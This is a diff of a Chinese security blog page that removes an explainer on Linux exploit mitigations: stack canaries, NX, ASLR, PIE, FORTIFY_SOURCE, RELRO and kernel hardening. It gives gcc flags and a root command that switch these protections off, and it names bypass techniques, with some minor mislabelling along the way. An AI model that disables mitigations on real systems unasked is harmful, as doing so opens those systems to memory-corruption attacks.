@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"www.stxletto.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"www.stxletto.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta name="description" content="安全风云波澜壮阔，对酒当歌人间值得。">
@@ -184,13 +184,6 @@
 
               <time title="创建时间：2020-04-28 08:00:00" itemprop="dateCreated datePublished" datetime="2020-04-28T08:00:00+08:00">2020-04-28</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-05 23:27:23" itemprop="dateModified" datetime="2020-05-05T23:27:23+08:00">2020-05-05</time>
-              </span>
 
           
 
@@ -203,133 +196,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Linux系统安全缺陷缓解机制"><a href="#Linux系统安全缺陷缓解机制" class="headerlink" title="Linux系统安全缺陷缓解机制"></a>Linux系统安全缺陷缓解机制</h1><p>现代Linux发行版提供了一些缓解技术，使更难稳定利用软件漏洞。 例如只读重定位（RELRO，RELocation Read-Only），禁止执行（NX，NoExecute），栈保护（Canaries），地址空间布局随机化（ASLR，Address Space Layout Randomization）和位置无关可执行文件（PIE，Position Independent Executables）之类的缓解措施，已经使稳定利已知漏洞的挑战的更加困难。</p>
-<h2 id="1-用户空间强化-Userspace-Hardening"><a href="#1-用户空间强化-Userspace-Hardening" class="headerlink" title="1 用户空间强化(Userspace Hardening)"></a>1 用户空间强化(Userspace Hardening)</h2><p>通过用于构建软件包的默认编译器标志以及Ubuntu内核，可以启用许多安全特性。 注意：Ubuntu的编译器强化不仅适用于其官方发布的程序，也适用于使用其编译器在Ubuntu上构建的任何内容。</p>
-<h3 id="1-1-栈的保护-Stack-Protector"><a href="#1-1-栈的保护-Stack-Protector" class="headerlink" title="1.1 栈的保护(Stack Protector)"></a>1.1 栈的保护(Stack Protector)</h3><p>很久之前，矿工在煤井中挖煤时，经常遇到瓦斯泄露的安全事故。后来有人发现一种鸟–金丝雀对瓦斯很敏感。于是矿工就用它作为安全报警装置。</p>
-<p>Stack Protector又名canary、stack cookie等，gcc中的-fstack-protector参数提供了一个随机的栈金丝雀(stack canary)，类似于Windows平台下Visual Studio中的GS。</p>
-<p>栈保护是一种针对栈缓冲区溢出攻击的缓解机制，当函数存在栈缓冲区溢出漏洞时，攻击者可以通过覆盖栈上的返回地址来执行shellcode。当启用栈保护后，调用函数前先往栈里存入一个cookie。在Linux中我们把这个cookie称为canary。当函数返回后再验证cookie是否和之前的值一致，如果不一致就终止进程。因为攻击者在覆盖返回地址的时候往往也会覆盖cookie，导致栈保护检查失败从而阻止执行任意代码。</p>
-<p>在编译时可以选择是否启用栈保护以及程度，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c						 &#x2F;&#x2F; 默认情况下，不开启 Canary 保护</span><br><span class="line">gcc -fno-stack-protector -o test test.c  &#x2F;&#x2F; 禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c     &#x2F;&#x2F; 启用栈保护，只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c &#x2F;&#x2F; 启用栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure>
-
-<p>绕过栈保护机制的常见方法有：泄露canary、暴破canary、劫持__stack_chk_fail、伪造canary、SSP泄露。</p>
-<p>详见：</p>
-<p><a href="https://www.anquanke.com/post/id/177832" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177832</a></p>
-<p><a href="https://zhakul.top/archives/216" target="_blank" rel="noopener">https://zhakul.top/archives/216</a></p>
-<h3 id="1-2-堆的保护-Heap-Protector"><a href="#1-2-堆的保护-Heap-Protector" class="headerlink" title="1.2 堆的保护(Heap Protector)"></a>1.2 堆的保护(Heap Protector)</h3><p>GNU C库堆保护机制（通过ptmalloc和手动两种方式自动进行）为glibc堆内存管理器（在glibc 2.3.4中首次引入）提供了对损坏列表/断开链接/双重释放/溢出( corrupted-list/unlink/double-free/overflow)的防护。 这将防止通过堆内存溢出破坏malloc堆内存区域的控制结构来执行任意代码的能力。</p>
-<h3 id="1-3-指针混淆-Pointer-Obfuscation"><a href="#1-3-指针混淆-Pointer-Obfuscation" class="headerlink" title="1.3 指针混淆(Pointer Obfuscation)"></a>1.3 指针混淆(Pointer Obfuscation)</h3><p>glibc中存储的某些指针会通过glibc内部的PTR_MANGLE/PTR_UNMANGLE宏进行混淆，以防止libc函数指针在运行时被覆盖。</p>
-<h3 id="1-4-不可执行内存-Non-Executable-Memory"><a href="#1-4-不可执行内存-Non-Executable-Memory" class="headerlink" title="1.4 不可执行内存(Non-Executable Memory)"></a>1.4 不可执行内存(Non-Executable Memory)</h3><p>大多数现代CPU都可以防止执行不可执行的内存区域（堆，堆栈等）。 这被称为“非eXecute（NX）”或“ eXecute-Disable（XD）”，某些BIOS制造商默认情况下会不必要地禁用它，因此请检查BIOS设置。 这种保护减少了攻击者可以用来执行任意代码执行的区域。 它要求内核使用“ PAE”寻址（也允许对3GB以上的物理地址进行寻址）。 64位和32位-server和-generic-pae内核使用PAE寻址进行编译。 从Ubuntu 9.10开始，针对在32位内核（带有或不带有PAE的内核）上运行的缺少NX的处理器，部分模拟了这种保护。</p>
-<p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标记为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
-<p>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c					&#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c		&#x2F;&#x2F; 禁用NX保护</span><br><span class="line">gcc -z noexecstack -o test test.c	&#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure>
-
-<p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p>
-<p>绕过NX防护手段的方法主要是ROP，详见：</p>
-<p><a href="https://www.cnblogs.com/ichunqiu/p/11196219.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/11196219.html</a></p>
-<h3 id="1-5-地址空间布局随机化-Address-Space-Layout-Randomisation"><a href="#1-5-地址空间布局随机化-Address-Space-Layout-Randomisation" class="headerlink" title="1.5 地址空间布局随机化(Address Space Layout Randomisation)"></a>1.5 地址空间布局随机化(Address Space Layout Randomisation)</h3><p>ASLR由内核和ELF加载器通过随机化内存分配（栈、堆、共享库等）的位置来实现。 这使得攻击者在尝试进行内存破坏利用时，内存地址更难预测。ASLR在系统范围内受/ proc / sys / kernel / randomize_va_space的值控制。 在Ubuntu 8.10之前，此选项默认为“ 1”（上）。 在包含brk ASLR的更高发行版中，它默认为“ 2”（在brk ASLR上启用）。</p>
-<p>ASLR(Address space layout randomization，地址空间布局随机化)通过随机放置数据区域的地址空间来防止攻击者跳转到内存的特定位置。在 Windows 上 ASLR 主要包括堆栈随机化、PEB与TEB随机化、映像随机化，windows系统上虽然xp时代就提出来了，但是从vista开始ASLR才真正发挥作用。在linux上ASLR主要包括栈地址随机化、LIBS/MMAP随机化、EXEC随机化、BRK随机化、VDSO随机化。在没有ASLR的情况下让程序跳转到一个已经存在的系统函数的漏洞利用方式被称为ret2libc。</p>
-<p>一般情况下NX（Windows平台上称其为DEP）和地址空间布局随机化（ASLR）会同时工作。可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
-<p>地址空间布局随机化，有以下三种情况：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - 表示关闭进程地址空间随机化。</span><br><span class="line">1 - 表示将mmap的基址，stack和vdso页面随机化。</span><br><span class="line">2 - 表示在1的基础上增加栈（heap）的随机化。</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-5-1-栈的ASLR"><a href="#1-5-1-栈的ASLR" class="headerlink" title="1.5.1 栈的ASLR"></a>1.5.1 栈的ASLR</h4><p>每次执行程序都会有不同的栈内存空间布局。 这使得很难在内存中定位要攻击或传递可执行攻击有效负载的位置。 </p>
-<h4 id="1-5-2-LIBS-MMAP的ASLR"><a href="#1-5-2-LIBS-MMAP的ASLR" class="headerlink" title="1.5.2 LIBS/MMAP的ASLR"></a>1.5.2 LIBS/MMAP的ASLR</h4><p>每次执行程序的都会产生不同的mmap内存空间布局（这会使动态加载库每次都加载到不同的内存地址）。 这使得很难在内存中找到类似“return to libc”攻击的跳转位置。</p>
-<p>可以这么理解，LIBS/MMAP随机化相当于windows中dll的随机化，而EXEC随机化相当于windows中exe的随机化。</p>
-<h4 id="1-5-3-EXEC的ASLR"><a href="#1-5-3-EXEC的ASLR" class="headerlink" title="1.5.3 EXEC的ASLR"></a>1.5.3 EXEC的ASLR</h4><p>使用“ -fPIE -pie”参数构建的程序的每次执行时，都将被加载到不同的内存位置。 这使得基于内存破坏的攻击，很难在内存中定位到要攻击或跳转的位置。</p>
-<h4 id="1-5-4-BRK的ASLR"><a href="#1-5-4-BRK的ASLR" class="headerlink" title="1.5.4 BRK的ASLR"></a>1.5.4 BRK的ASLR</h4><p>与exec ASLR相似，brk ASLR调整exec内存区域和brk内存区域之间的相对内存位置（对于small malloc）。 在2.6.26（Ubuntu 8.10）中添加了来自exec内存的brk偏移量的随机化，尽管brk ASLR的一些影响可以在Ubuntu 8.04 LTS中的PIE程序中看到，因为exec是ASLR，并且brk在执行后立即分配 区域（因此从技术上讲是随机的，但直到8.10才相对于文本区域随机化）。</p>
-<p>linux系统中brk和mmap这两个系统调用用来分配内存。当brk ASLR关闭的时候，start_brk和brk都是指向bss段的尾部的；当brk ASLR开启的时候，start_brk和brk初始位置是bss段的尾部加一个随机的偏移。</p>
-<h4 id="1-5-5-VDSO的ASLR"><a href="#1-5-5-VDSO的ASLR" class="headerlink" title="1.5.5 VDSO的ASLR"></a>1.5.5 VDSO的ASLR</h4><p>程序的每次执行都会导致一个随机的vdso位置。 这样可以防止跳入系统调用(jump-into-syscall)攻击。</p>
-<p>VDSO(Virtual Dynamically-linked Shared Object，虚拟动态共享库)将内核态的调用映射到用户态的地址空间中，使得调用开销更小，路径更好。拿x86下的系统调用举例，传统的int 0x80有点慢，Intel和AMD分别实现了sysenter/sysexit和syscall/sysret，即所谓的快速系统调用指令，使用它们更快，但是也带来了兼容性的问题。于是linux实现了vsyscall，程序统一调用vsyscall，具体的选择由内核来决定，vsyscall的实现就在VDSO中。执行ldd /bin/sh，会发现有个linux-vdso.so.1的动态文件，而系统中却找不到它，它就是VDSO。</p>
-<h3 id="1-6-编译时强化-Built-with"><a href="#1-6-编译时强化-Built-with" class="headerlink" title="1.6 编译时强化(Built with)"></a>1.6 编译时强化(Built with)</h3><h4 id="1-6-1-编译时使用PIE参数-Built-as-PIE"><a href="#1-6-1-编译时使用PIE参数-Built-as-PIE" class="headerlink" title="1.6.1 编译时使用PIE参数(Built as PIE)"></a>1.6.1 编译时使用PIE参数(Built as PIE)</h4><p>使用“ -fPIE -pie”参数构建的位置无关可执行文件（PIE）都可以利用exec ASLR。 这样可以防止“返回文本(return-to-text)”，并且通常会阻止内存破坏攻击。 在构建整个程序包时，需要对编译器选项进行统一更改。 PIE在只有较少数量的通用寄存器（例如x86）的体系结构上会造成很大的性能损失（5-10％），因此它最初仅用于选定数量的安全关键软件包。在64位体系结构上的PIE没有相同的缺陷，并且已将其设为默认值。</p>
-<p>前面说了EXEC的随机化，实际上更准确的说法是PIE(Position Independent Executables，位置无关可执行文件)。PIE只有在系统开启ASLR和编译时开启-fpie -pie选项这两个条件同时满足时才会生效。</p>
-<ul>
-<li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li>
-</ul>
-<p>位置无关的可执行文件（PIE，Position Independent Executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
-<p>liunx下关闭PIE的命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -s echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure>
-
-<p>gcc编译命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c				&#x2F;&#x2F; 默认情况下，不开启PIE</span><br><span class="line">gcc -fpie -pie -o test test.c		&#x2F;&#x2F; 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c		&#x2F;&#x2F; 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		&#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		&#x2F;&#x2F; 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure>
-
-<p>PIE最早由RedHat的人实现，他在连接起上增加了-pie选项，这样使用-fPIE编译的对象就能通过连接器得到位置无关可执行程序。fPIE和fPIC有些不同。可以参考<a href="http://writeblog.csdn.net/2009/11/20/10065/" target="_blank" rel="noopener">Gcc和Open64中的-fPIC选项</a>.</p>
-<p>gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global Offset<br>Table)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。</p>
-<p>gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。</p>
-<p>绕过PIE</p>
-<p><a href="https://www.cnblogs.com/ichunqiu/p/11350476.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/p/11350476.html</a></p>
-<h4 id="1-6-2-编译时使用Fortify-Source参数-Built-with-Fortify-Source"><a href="#1-6-2-编译时使用Fortify-Source参数-Built-with-Fortify-Source" class="headerlink" title="1.6.2 编译时使用Fortify Source参数(Built with Fortify Source)"></a>1.6.2 编译时使用Fortify Source参数(Built with Fortify Source)</h4><p>使用“ -D_FORTIFY_SOURCE = 2”（以及-O1或更高版本）构建的程序在glibc中启用了几种编译时和运行时保护：</p>
-<ul>
-<li>当已知目的缓冲区的大小时，将对“ sprintf”，“ strcpy”的无长度限定的调用扩展为它们有长度限制的表亲函数（防止内存溢出）。</li>
-<li>当格式化字符串位于可写内存段中时，阻止使用格式字化符串“％n”的攻击。</li>
-<li>检查重要的函数返回值和参数（例如system，write，open）。</li>
-<li>创建新文件时需要指定文件掩码。</li>
-</ul>
-<p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p>
-<p>_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(<em>gcc -O1</em>)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p>
-<p>_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p>
-<p><code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 <code>#include &lt;string.h&gt;</code>)</p>
-<p><code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p>
-<p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void fun(char *s) &#123;</span><br><span class="line">        char buf[0x100];</span><br><span class="line">        strcpy(buf, s);</span><br><span class="line">        &#x2F;* Don&#39;t allow gcc to optimise away the buf *&#x2F;</span><br><span class="line">        asm volatile(&quot;&quot; :: &quot;m&quot; (buf));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>用包含参数-U_FORTIFY_SOURCE编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">08048450 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ; </span><br><span class="line">  mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">  sub    $0x118,%esp        ; 将0x118存储到栈上</span><br><span class="line">  mov    0x8(%ebp),%eax     ; 将目标参数载入eax</span><br><span class="line">  mov    %eax,0x4(%esp)     ; 保存目标参数</span><br><span class="line">  lea    -0x108(%ebp),%eax  ; 数组buf</span><br><span class="line">  mov    %eax,(%esp)        ; 保存</span><br><span class="line">  call   8048320 &lt;strcpy@plt&gt;</span><br><span class="line"></span><br><span class="line">  leave                     ; </span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>
-
-<p>用包含参数-D_FORTIFY_SOURCE=2编译</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">08048470 &lt;fun&gt;:</span><br><span class="line">  push   %ebp               ; </span><br><span class="line">  mov    %esp,%ebp</span><br><span class="line"></span><br><span class="line">  sub    $0x118,%esp        ; </span><br><span class="line">  movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存</span><br><span class="line">  mov    0x8(%ebp),%eax     ; </span><br><span class="line">  mov    %eax,0x4(%esp)     ; </span><br><span class="line">  lea    -0x108(%ebp),%eax  ; </span><br><span class="line">  mov    %eax,(%esp)        ; </span><br><span class="line">  call   8048370 &lt;__strcpy_chk@plt&gt;</span><br><span class="line"></span><br><span class="line">  leave                      ; </span><br><span class="line">  ret</span><br></pre></td></tr></table></figure>
-
-<p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p>
-<p>总结下就有:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c							&#x2F;&#x2F; 默认情况下，不会开这个检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c		&#x2F;&#x2F; 较弱的检查</span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c		&#x2F;&#x2F; 较强的检查</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-6-3-编译时使用RELRO参数-Built-with-RELRO"><a href="#1-6-3-编译时使用RELRO参数-Built-with-RELRO" class="headerlink" title="1.6.3 编译时使用RELRO参数(Built with RELRO)"></a>1.6.3 编译时使用RELRO参数(Built with RELRO)</h4><p>在Linux系统安全领域数据可以写的内存区域就会是攻击的目标，尤其是存储函数指针的地方。所以从安全防护的角度来说，尽量减少可写的内存区域对安全会有极大的好处。</p>
-<p>通过使加载程序将重定位表的任何区域标记为只读，以在加载时解析任何符号（“只读重定位”），从而使ELF程序防范加载程序内存区覆盖写的攻击。这减少了GOT覆盖写形式(GOT-overwrite-style)的内存破坏攻击的范围。</p>
-<p>RELRO(RELocation Read-Only，只读重定位)让加载器将重定位表中加载时解析的符号标记为只读，这减少了GOT覆盖写的攻击面。RELRO可以分为部分RELRO(Partial RELRO)和完全RELRO(Full RELRO)。开启Partial RELRO的话GOT表是可写的；开启FULL RELRO的话GOT表是只读的。开启-Wl,-z,relro选项即可开启Partial RELRO；开启-Wl,-z,relro,-z,now选项即可开启Full RELRO。</p>
-<p>设置符号重定位表为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。当RELRO为” Partial RELRO”时，说明我们对GOT表具有写权限；如果开启FULL RELRO，意味着我们无法修改GOT表。</p>
-<p>gcc编译：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c						&#x2F;&#x2F; 默认情况下，是 Partial RELRO</span><br><span class="line">gcc -z norelro -o test test.c			&#x2F;&#x2F; 关闭，即 No RELRO</span><br><span class="line">gcc -z lazy -o test test.c				&#x2F;&#x2F; 部分开启，即 Partial RELRO</span><br><span class="line">gcc -z now -o test test.c				&#x2F;&#x2F; 全部开启，即 FULL RELRO</span><br></pre></td></tr></table></figure>
-
-<h4 id="1-6-4-编译时使用BIND-NOW参数-Built-with-BIND-NOW"><a href="#1-6-4-编译时使用BIND-NOW参数-Built-with-BIND-NOW" class="headerlink" title="1.6.4 编译时使用BIND_NOW参数(Built with BIND_NOW)"></a>1.6.4 编译时使用BIND_NOW参数(Built with BIND_NOW)</h4><p>标记ELF程序在启动时就解析所有动态符号（而不是”按需形式“(延时绑定)，也称为“立即绑定”），以便可以将GOT完全设为只读（与上面的RELRO结合使用时）。</p>
-<h4 id="1-6-5-编译时使用fstack-clash参数-Built-with-fstack-clash-protection"><a href="#1-6-5-编译时使用fstack-clash参数-Built-with-fstack-clash-protection" class="headerlink" title="1.6.5 编译时使用fstack-clash参数(Built with -fstack-clash-protection)"></a>1.6.5 编译时使用fstack-clash参数(Built with -fstack-clash-protection)</h4><p>在可变长度栈内存分配（通过alloca()或gcc可变长度数组等）周围添加额外的指令，以在分配时探测内存的每一页。 通过确保所有栈内存分配均有效（或通过引发分段错误（如果无效）并把可能的代码执行攻击转变为拒绝服务），这可以缓解栈冲突(stack-clash)攻击。</p>
-<h4 id="1-6-6-编译时使用-fcf-protection参数-Built-with-fcf-protection"><a href="#1-6-6-编译时使用-fcf-protection参数-Built-with-fcf-protection" class="headerlink" title="1.6.6 编译时使用-fcf-protection参数(Built with -fcf-protection)"></a>1.6.6 编译时使用-fcf-protection参数(Built with -fcf-protection)</h4><p>指示编译器生成指令以支持英特尔的控制流强制技术（CET,  Control-flow Enforcement Technology）。</p>
-<h2 id="2-内核强化-Kernel-Hardening"><a href="#2-内核强化-Kernel-Hardening" class="headerlink" title="2 内核强化(Kernel Hardening)"></a>2 内核强化(Kernel Hardening)</h2><p>内核本身启用的保护功能，使其更难以受到威胁。</p>
-<h3 id="2-1-零地址保护-0-address-protection"><a href="#2-1-零地址保护-0-address-protection" class="headerlink" title="2.1 零地址保护(0-address protection)"></a>2.1 零地址保护(0-address protection)</h3><p>由于内核和用户空间共享虚拟内存地址，因此需要对“ NULL”内存地址进行保护，以使用户空间mmap的内存无法从地址0开始，从而阻止” NULL解引用”(“NULL dereference”)内核攻击。</p>
-<h3 id="2-2-dev-mem保护-dev-mem-protection"><a href="#2-2-dev-mem保护-dev-mem-protection" class="headerlink" title="2.2 /dev/mem保护(/dev/mem protection)"></a>2.2 /dev/mem保护(/dev/mem protection)</h3><p>某些应用程序（Xorg）需要从用户空间直接访问物理内存。 存在特殊文件/ dev / mem来提供此访问。 过去，如果攻击者具有root用户访问权限，则可以从该文件查看和更改内核内存。 引入了CONFIG_STRICT_DEVMEM内核选项以阻止对非设备存储器的访问。</p>
-<h3 id="2-3-禁用-dev-kmem-dev-kmem-disabled"><a href="#2-3-禁用-dev-kmem-dev-kmem-disabled" class="headerlink" title="2.3 禁用/dev/kmem(/dev/kmem disabled)"></a>2.3 禁用/dev/kmem(/dev/kmem disabled)</h3><p>/ dev / kmem不再是现代用户，攻击者无法使用它来加载内核rootkit。 CONFIG_DEVKMEM设置为“ n”。 尽管/ dev / kmem设备节点通过Ubuntu 9.04在Ubuntu 8.04 LTS中仍然存在，但实际上并没有附加到内核中的任何内容。</p>
-<h3 id="2-4-禁止模块加载-Block-module-loading"><a href="#2-4-禁止模块加载-Block-module-loading" class="headerlink" title="2.4 禁止模块加载(Block module loading)"></a>2.4 禁止模块加载(Block module loading)</h3><p>在Ubuntu 8.04 LTS及更早版本中，可以从系统范围的功能边界集中删除CAP_SYS_MODULES，这将阻止加载任何新的内核模块。 这是阻止安装内核rootkit的另一层保护。 2.6.25 Linux内核（Ubuntu 8.10）更改了边界集的工作方式，该功能消失了。 从Ubuntu 9.10开始，现在可以通过在/ proc / sys / kernel / modules_disabled中设置“ 1”来再次阻止模块加载。</p>
-<h3 id="2-5-只读数据节-Read-only-data-sections"><a href="#2-5-只读数据节-Read-only-data-sections" class="headerlink" title="2.5 只读数据节(Read-only data sections)"></a>2.5 只读数据节(Read-only data sections)</h3><p>这样可以确保将某些内核数据段标记为禁止修改。 这有助于防止某些类的内核rootkit。 通过CONFIG_DEBUG_RODATA选项启用。</p>
-<h3 id="2-6-栈的保护-Stack-protector"><a href="#2-6-栈的保护-Stack-protector" class="headerlink" title="2.6 栈的保护(Stack protector)"></a>2.6 栈的保护(Stack protector)</h3><p>类似于ELF程序用户空间中的栈保护器，内核也可以保护其内部栈。 通过CONFIG_CC_STACKPROTECTOR选项启用。</p>
-<h3 id="2-7-模块只读或不可执行-Module-RO-NX"><a href="#2-7-模块只读或不可执行-Module-RO-NX" class="headerlink" title="2.7 模块只读或不可执行(Module RO/NX)"></a>2.7 模块只读或不可执行(Module RO/NX)</h3><p>此功能扩展了CONFIG_DEBUG_RODATA，对内核中已加载模块也有类似限制。 这可以帮助抵御依赖已加载模块中各种内存区域的内核攻击。通过CONFIG_DEBUG_MODULE_RONX选项启用。</p>
-<h3 id="2-8-限制内核地址显示-Kernel-Address-Display-Restriction"><a href="#2-8-限制内核地址显示-Kernel-Address-Display-Restriction" class="headerlink" title="2.8 限制内核地址显示(Kernel Address Display Restriction)"></a>2.8 限制内核地址显示(Kernel Address Display Restriction)</h3><p>当攻击者试图开发通用性更强的漏洞利用程序时，他们通常需要知道内核结构的位置。 通过将内核地址视为敏感信息，常规本地用户无法看到那些地址。 从Ubuntu 11.04开始，/ proc / sys / kernel / kptr_restrict设置为“ 1”，以阻止报告已知的内核地址泄漏。 此外，只有root用户才能读取各种文件和目录：/boot/vmlinuz<em>、/boot/System.map</em>、/sys/kernel/debug/、/proc/slabinfo</p>
